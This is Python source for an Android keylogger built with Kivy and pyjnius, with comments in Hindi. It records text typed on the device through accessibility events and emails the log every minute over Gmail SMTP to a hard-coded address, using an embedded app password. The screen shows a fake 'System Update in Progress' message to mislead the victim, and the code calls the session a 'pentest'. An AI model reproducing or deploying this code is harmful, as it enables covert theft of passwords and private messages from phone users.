from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from jnius import autoclass
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Java classes for Android Accessibility events
AccessibilityEvent = autoclass('android.view.accessibility.AccessibilityEvent')

class KeyloggerApp(App):
    def build(self):
        # --- CONFIGURATION ---
        self.receiver_email = "ompravassahoo84@gmail.com"
        self.app_password = "gwvclbfflxcvpgdx" # <--- Yahan apna code dalein
        self.log_buffer = "--- Pentest Session Started ---\n"

        # Har 60 seconds mein email bhejega
        Clock.schedule_interval(self.send_logs, 60)
        
        return Label(text="System Update in Progress...\nPlease do not close.")

    def on_accessibility_event(self, event):
        # Ye logic background typing capture karta hai
        if event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
            captured_text = event.getText().toString()
            self.log_buffer += f"\n[Typed]: {captured_text}"

    def send_logs(self, dt):
        if not self.log_buffer.strip():
            return

        try:
            message = MIMEMultipart()
            message["From"] = self.receiver_email
            message["To"] = self.receiver_email
            message["Subject"] = "Android Keylog Report"
            message.attach(MIMEText(self.log_buffer, "plain"))

            context = ssl.create_default_context()
            with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                server.login(self.receiver_email, self.app_password)
                server.send_message(message)
            
            self.log_buffer = "" # Success ke baad buffer reset
        except Exception as e:
            print(f"Error: {e}")

    def on_pause(self):
        return True # App ko background mein zinda rakhne ke liye

if __name__ == "__main__":
    KeyloggerApp().run()
  
